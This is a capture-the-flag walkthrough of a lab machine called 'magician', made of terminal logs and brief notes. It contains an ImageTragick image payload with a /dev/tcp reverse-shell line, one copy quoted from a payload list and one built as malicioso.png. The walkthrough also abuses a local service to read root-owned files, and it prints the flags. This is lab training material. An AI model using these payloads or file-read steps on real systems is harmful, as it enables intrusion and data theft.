```
┌──(kali㉿kali)-[~]
└─$ sudo su                   
[sudo] password for kali: 
┌──(root㉿kali)-[/home/kali]
└─# nano /etc/hosts                                                          
                                                                                     
┌──(root㉿kali)-[/home/kali]
└─# cat /etc/hosts     
127.0.0.1       localhost
127.0.1.1       kali
10.10.113.254   magician
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters


┌──(kali㉿kali)-[~/Downloads]
└─$ rustscan -a magician --ulimit 5000 -b 65535 -- -A 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.113.254:21
Open 10.10.113.254:8081
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-02 00:07 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 00:07
Completed NSE at 00:07, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 00:07
Completed NSE at 00:07, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 00:07
Completed NSE at 00:07, 0.00s elapsed
Initiating Ping Scan at 00:07
Scanning 10.10.113.254 [2 ports]
Completed Ping Scan at 00:07, 0.27s elapsed (1 total hosts)
Initiating Connect Scan at 00:07
Scanning magician (10.10.113.254) [2 ports]
Discovered open port 21/tcp on 10.10.113.254
Discovered open port 8081/tcp on 10.10.113.254
Completed Connect Scan at 00:07, 0.24s elapsed (2 total ports)
Initiating Service scan at 00:07
Scanning 2 services on magician (10.10.113.254)
Completed Service scan at 00:07, 12.16s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.113.254.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 00:07
Completed NSE at 00:08, 17.09s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 00:08
Completed NSE at 00:08, 2.98s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 00:08
Completed NSE at 00:08, 0.00s elapsed
Nmap scan report for magician (10.10.113.254)
Host is up, received conn-refused (0.26s latency).
Scanned at 2022-08-02 00:07:46 EDT for 33s

PORT     STATE SERVICE REASON  VERSION
21/tcp   open  ftp     syn-ack vsftpd 2.0.8 or later
8081/tcp open  http    syn-ack nginx 1.14.0 (Ubuntu)
|_http-title: magician
|_http-favicon: Unknown favicon MD5: CA4D0E532A1010F93901DFCB3A9FC682
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 00:08
Completed NSE at 00:08, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 00:08
Completed NSE at 00:08, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 00:08
Completed NSE at 00:08, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.70 seconds

──(kali㉿kali)-[~/Downloads]
└─$ ftp magician     
Connected to magician.
220 THE MAGIC DOOR
Name (magician:kali): anonymous
331 Please specify the password.
Password: 

a230-Huh? The door just opens after some time? You're quite the patient one, aren't ya, it's a thing called 'delay_successful_login' in /etc/vsftpd.conf ;) Since you're a rookie, this might help you to get started: https://imagetragick.com. You might need to do some little tweaks though...
230 Login successful.

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Picture%20Image%20Magik#exploit-v1
Image Tragik 1 & 2
Exploit v1

Simple reverse shell

push graphic-context
encoding "UTF-8"
viewbox 0 0 1 1
affine 1 0 0 1 0 0
push graphic-context
image Over 0,0 1,1 '|/bin/sh -i > /dev/tcp/ip/80 0<&1 2>&1'
pop graphic-context
pop graphic-context


                                                                                     
┌──(kali㉿kali)-[~/Downloads]
└─$ cat > malicioso.png << EOF
heredoc> push graphic-context     
heredoc> encoding "UTF-8"          
heredoc> viewbox 0 0 1 1
heredoc> affine 1 0 0 1 0 0
heredoc> push graphic-context     
heredoc> image 0ver 0,0 1,1 '|/bin/bash -i > /dev/tcp/10.18.1.77/4444 0<&1 2>&1'
heredoc> pop graphic-context      
heredoc> pop graphic-context      
heredoc> EOF
***upload img***(malicioso.png)
http://magician:8081/

┌──(kali㉿kali)-[~]
└─$ rlwrap nc -nlvp 4444                                   
listening on [any] 4444 ...
connect to [10.18.1.77] from (UNKNOWN) [10.10.113.254] 35348
bash: cannot set terminal process group (953): Inappropriate ioctl for device
bash: no job control in this shell
magician@magician:/tmp/hsperfdata_magician$ 
bash: cannot set terminal process group (953): Inappropriate ioctl for device
bash: no job control in this shell
id
id
uid=1000(magician) gid=1000(magician) groups=1000(magician)
cd /home
cd /home
ll
ll
total 12
drwxr-xr-x  3 root     root     4096 Jan 30  2021 ./
drwxr-xr-x 24 root     root     4096 Jan 30  2021 ../
drwxr-xr-x  5 magician magician 4096 Feb 13  2021 magician/
cd magician
cd magician
ls -la
ls -la
total 17204
drwxr-xr-x 5 magician magician     4096 Feb 13  2021 .
drwxr-xr-x 3 root     root         4096 Jan 30  2021 ..
lrwxrwxrwx 1 magician magician        9 Feb  6  2021 .bash_history -> /dev/null
-rw-r--r-- 1 magician magician      220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 magician magician     3771 Apr  4  2018 .bashrc
drwx------ 2 magician magician     4096 Jan 30  2021 .cache
drwx------ 3 magician magician     4096 Jan 30  2021 .gnupg
-rw-r--r-- 1 magician magician      807 Apr  4  2018 .profile
-rw-r--r-- 1 magician magician        0 Jan 30  2021 .sudo_as_admin_successful
-rw------- 1 magician magician     7546 Jan 31  2021 .viminfo
-rw-r--r-- 1 root     root     17565546 Jan 30  2021 spring-boot-magician-backend-0.0.1-SNAPSHOT.jar
-rw-r--r-- 1 magician magician      170 Feb 13  2021 the_magic_continues
drwxr-xr-x 2 root     root         4096 Feb  5  2021 uploads
-rw-r--r-- 1 magician magician       24 Jan 30  2021 user.txt
cat user.txt
cat user.txt
THM{simsalabim_hex_hex}
magician@magician:~$ 
Looking in the folder we see another note

magician@magician:~$ cat the_magic_continues 
The magician is known to keep a locally listening cat up his sleeve, it is said to be an oracle who will tell you secrets if you are good enough to understand its meows.

Looking at netstat we can see :6666 locally

magician@magician:~$ netstat -anp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:8081            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:6666          0.0.0.0:*               LISTEN      -                   
tcp        0    284 10.10.126.74:51174      10.9.0.7:4444           ESTABLISHED 1425/sh             
tcp6       0      0 :::8080                 :::*                    LISTEN      975/java            
tcp6       0      0 :::21                   :::*                    LISTEN      -                   
tcp6       0      0 10.10.126.74:8080       10.9.0.7:49564          ESTABLISHED 975/java            
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 10.10.126.74:68         0.0.0.0:*                           -                   
raw6       0      0 :::58                   :::*                    7           -                   
Active UNIX domain sockets (servers and established)

Using curl on this port we get

<!DOCTYPE html>
<html>
  <head>
    <title>The Magic cat</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- Bootstrap -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
  </head>
  <body>
<div class="navbar navbar-inverse" role="navigation">
    <div class="container">
        <div class="navbar-header">            
            <a class="navbar-brand" href="/">The Magic cat</a>
        </div>        
    </div>
</div>
<div class="container">
<form action="" method="post"
  class="form" role="form">
<div class="form-group "><label class="control-label" for="filename">Enter filename</label>
        
          <input class="form-control" id="filename" name="filename" type="text" value="">
  </div>
    <input class="btn btn-default" id="submit" name="submit" type="submit" value="Submit">
</form>
<div>
    <span>
        <pre class="page-header">
        ░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄░░░░░░░
        ░░░░░█░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░▀▀▄░░░░
        ░░░░█░░░▒▒▒▒▒▒░░░░░░░░▒▒▒░░█░░░
        ░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█░░
        ░▄▀▒▄▄▄▒░█▀▀▀▀▄▄█░░░██▄▄█░░░░█░
        █░▒█▒▄░▀▄▄▄▀░░░░░░░░█░░░▒▒▒▒▒░█
        █░▒█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄▒█
        ░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█░
        ░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█░░
        ░░░█░░░░██░░▀█▄▄▄█▄▄█▄████░█░░░
        ░░░░█░░░░▀▀▄░█░░░█░█▀██████░█░░
        ░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█░░
        ░░░░░░░▀▄▄░▒▒▒▒░░░░░░░░░░▒░░░█░
        ░░░░░░░░░░▀▀▄▄░▒▒▒▒▒▒▒▒▒▒░░░░█░
        ░░░░░░░░░░░░░░▀▄▄▄▄▄░░░░░░░░█░░
        </pre>
    </span>
</div>
</div>    
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <script src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/js/bootstrap.min.js"></script>
  </body>
</html>

I tried some port forwarding with meterpreter but didn't get anything working. Falling back to curl we can post something using filename as the input name.

Using test as filename we get

magician@magician:~$ curl -X POST http://127.0.0.1:6666 -d "filename=test"
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either th
So let's try a file that exists /etc/passwd

magician@magician:~$ curl -X POST http://127.0.0.1:6666 -d "filename=/etc/passwd"

This returns the /etc/passwd file but the content is encoded. Let's see if we can read /root/root.txt

curl -X POST http://127.0.0.1:6666 -d "filename=/root/root.txt"

Success we can read the file but it is encoded ..... keep running the command until you see a encoding you recognize and decode. I waited until I saw GUZ{ which looked like rot13

curl -X POST http://127.0.0.1:6666 -d "filename=/root/root.txt"
< http://127.0.0.1:6666 -d "filename=/root/root.txt"
<!DOCTYPE html>
<html>
  <head>
    <title>The Magic cat</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- Bootstrap -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
  </head>
  <body>
    
<div class="navbar navbar-inverse" role="navigation">
    <div class="container">
        <div class="navbar-header">            
            <a class="navbar-brand" href="/">The Magic cat</a>
        </div>        
    </div>
</div>

    
<div class="container">
    

<form action="" method="post"
  class="form" role="form">
  
  
    




<div class="form-group "><label class="control-label" for="filename">Enter filename</label>
        
          <input class="form-control" id="filename" name="filename" type="text" value="/root/root.txt">
        
  </div>


    





  

  
  


    <input class="btn btn-default" id="submit" name="submit" type="submit" value="Submit">
  





</form>
<div>
    <span>
        <pre class="page-header">
        VEhNe21hZ2ljX21heV9tYWtlX21hbnlfbWVuX21hZH0K
        
        </pre>
    </span>
</div>

</div>


    
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <script src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/js/bootstrap.min.js"></script>
  </body>
</html>
magician@magician:~$ 

VEhNe21hZ2ljX21heV9tYWtlX21hbnlfbWVuX21hZH0K -> 

Press Submit until you get a base64 encoded string (the program is rotating through a bunch of encodings, including hex, binary, md5, base64).

Once we have our root flag as base64 encoded string, let’s decode it:

kali@kali:/data/src$ echo "VEhNe21hZ2ljX21heV9tYWtlX21hbnlfbWVuX21hZH0K" | base64 -d
THM{magic_may_make_many_men_mad}

Root flag: THM{magic_may_make_many_men_mad} 
```

[[Looking_Glass]]